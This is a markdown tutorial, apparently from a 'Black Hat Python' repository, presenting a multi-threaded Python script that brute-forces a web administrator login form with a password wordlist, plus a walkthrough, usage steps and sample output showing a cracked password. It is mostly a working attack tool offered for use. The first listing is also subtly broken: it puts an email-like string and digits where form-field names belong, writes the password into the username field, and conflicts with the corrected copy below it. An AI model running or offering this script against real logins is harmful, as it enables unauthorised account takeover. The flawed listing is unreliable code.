# **🔑 Multi-threaded Brute-Force Login Script**

This script attempts **brute-force attacks** on a login form using a **username + password list**. It automates login attempts using **multi-threading** and a **cookie-based session** to simulate real browser behavior.

- [cain.txt](https://github.com/aw-junaid/Black-Hat-Python/blob/main/Python%20Tools/Extras/cain.txt)
- [SVN_all.txt](https://github.com/aw-junaid/Black-Hat-Python/blob/main/Python%20Tools/Extras/SVN_all.txt)

```python
import http.cookiejar
import queue
import threading
import urllib.error
import urllib.parse
import urllib.request
from abc import ABC #Abstract Base Classes 
from html.parser import HTMLParser

# global settings
user_thread = 10
username = "admin"
wordlist_file = "cain.txt"
resume = None

# target settings
# start from a local testing installation before going into the wild
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "choudharysardar957@gmail.com"
password_field = "80947750"

success_check = "Administration - Control Panel"

class BruteParser(HTMLParser, ABC):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if tag_name:
                    self.tag_results[tag_name] = value 

class Bruter(object):
    def __init__(self, user, words_q):
        self.username = user
        self.password_q = words_q
        self.found = False
        print(f"Finished setting up for: {user}")

    def run_bruteforce(self):
        for thread in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read
            print(f"Trying: {self.username}: {brute} ({self.password_q.qsize()} left)")

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[username_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read()

            if success_check in login_result:
                self.found = True 
                print("[*] Bruteforce successful.")
                print(f"[*] Username: {username}")
                print(f"[*] Password:{brute}")
                print("[*] Waiting for other threads to exit...")

def build_wordlist(word_list_file):
    with open (word_list_file, "r") as l:
        raw_words = [line.rstrip("\n") for line in l]

    found_resume = False
    word_queue = queue.Queue()

    for word in raw_words:
        if resume:
            if found_resume:
                word_queue.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print(f"Resuming wordlist from: {resume}")
        else:
            word_queue.put(word)
    return word_queue

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
```

## **📌 Features**
✔ **Multi-threaded (default: 10 threads) for faster attacks**  
✔ **Reads password list from a file (`cain.txt`)**  
✔ **Automatically extracts hidden input fields from the login form**  
✔ **Uses cookies (`http.cookiejar`) to maintain sessions**  
✔ **Supports resuming attacks from a specific word**  
✔ **Detects successful logins by checking page content**  

---

## **📜 Code Explanation**

### **1️⃣ Import Required Modules**
```python
import http.cookiejar
import queue
import threading
import urllib.error
import urllib.parse
import urllib.request
from abc import ABC  # Abstract Base Classes
from html.parser import HTMLParser
```
- **`http.cookiejar`** → Stores and processes cookies  
- **`queue`** → Manages passwords for **multi-threading**  
- **`threading`** → Runs multiple login attempts **simultaneously**  
- **`urllib`** → Handles HTTP requests and form data encoding  
- **`html.parser`** → Extracts hidden form fields from login page  
- **`ABC` (Abstract Base Classes)** → Used for class inheritance  

---

### **2️⃣ Configuration Variables**
```python
user_thread = 10  # Number of concurrent threads
username = "admin"  # Username to brute-force
wordlist_file = "cain.txt"  # Password list file
resume = None  # Resume from a specific password

# Target settings (replace with actual login page)
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

# HTML form field names
username_field = "username"
password_field = "pswd"

# Success indicator (text found in successful login response)
success_check = "Administration - Control Panel"
```
- **`user_thread`** → Number of parallel brute-force attempts  
- **`username`** → Fixed username for brute-forcing  
- **`wordlist_file`** → List of **passwords to try**  
- **`resume`** → Resume from a specific **password** if interrupted  
- **`target_url`** → Page where the **login form is located**  
- **`target_post`** → Page where the **form submits login data**  
- **`username_field`, `password_field`** → Form **input field names**  
- **`success_check`** → If this text appears after login → **brute-force successful**  

---

### **3️⃣ Extract Hidden Fields from Login Page**
```python
class BruteParser(HTMLParser, ABC):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if tag_name:
                    self.tag_results[tag_name] = value
```
- **`BruteParser`** → Extracts **hidden input fields** from login page  
- **`handle_starttag()`** → Finds `<input>` fields and **stores them**  
- This ensures we **send all required form fields** (not just username/password)  

---

### **4️⃣ Brute-force Logic**
```python
class Bruter(object):
    def __init__(self, user, words_q):
        self.username = user
        self.password_q = words_q
        self.found = False
        print(f"Finished setting up for: {user}")

    def run_bruteforce(self):
        for thread in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()
            print(f"Trying: {self.username}: {brute} ({self.password_q.qsize()} left)")

            # Extract hidden fields
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results

            # Add login credentials
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            # Encode form data
            login_data = urllib.parse.urlencode(post_tags).encode()
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read().decode()

            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful.")
                print(f"[*] Username: {username}")
                print(f"[*] Password: {brute}")
                print("[*] Waiting for other threads to exit...")
```
### **💡 How it Works:**
1. **Loads the password list into a queue**  
2. **Starts multiple threads (`user_thread` = 10)**  
3. **Each thread:**  
   - Retrieves a password from the queue  
   - Loads the login page (**to capture cookies & hidden fields**)  
   - **Fills the login form** with username & password  
   - Sends a **POST request** to attempt login  
   - If the response **contains `success_check`**, login was **successful** 🎯  
4. **Stops other threads when a password is found**  

---

### **5️⃣ Load Wordlist & Start Attack**
```python
def build_wordlist(word_list_file):
    with open(word_list_file, "r") as l:
        raw_words = [line.rstrip("\n") for line in l]

    found_resume = False
    word_queue = queue.Queue()

    for word in raw_words:
        if resume:
            if found_resume:
                word_queue.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print(f"Resuming wordlist from: {resume}")
        else:
            word_queue.put(word)
    return word_queue

words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
```
- **Reads the password list (`cain.txt`)**  
- **Supports resuming** from a specific password  
- **Stores passwords in a queue** (`word_queue`)  
- **Starts the brute-force attack**  

---

## **🚀 How to Use**
### **📌 Prerequisites**
1. Install **Python 3.x**  
2. Download a password list (`cain.txt`)  

### **📌 Update Configuration**
- **Set `target_url` & `target_post`**  
- **Modify `username`** to match the target  
- **Ensure `username_field` & `password_field`** match the form  

### **📌 Run the Script**
```bash
python script.py
```

---

## **🎯 Example Output**
```bash
Finished setting up for: admin
Trying: admin: 123456 (499 left)
Trying: admin: password (498 left)
Trying: admin: admin123 (497 left)
[*] Bruteforce successful.
[*] Username: admin
[*] Password: admin123
[*] Waiting for other threads to exit...
```
- **Tries passwords from `cain.txt`**  
- **Stops once a valid login is found** ✅  

---

## **🎭 Summary**
✔ **Multi-threaded brute-force attack**  
✔ **Extracts hidden form fields automatically**  
✔ **Maintains session using cookies**  
✔ **Can resume from a specific password**  
✔ **Detects successful logins & stops threads**  

This tool is useful for **penetration testing, ethical hacking, & security research** to **test login strength**. 🚀  

---
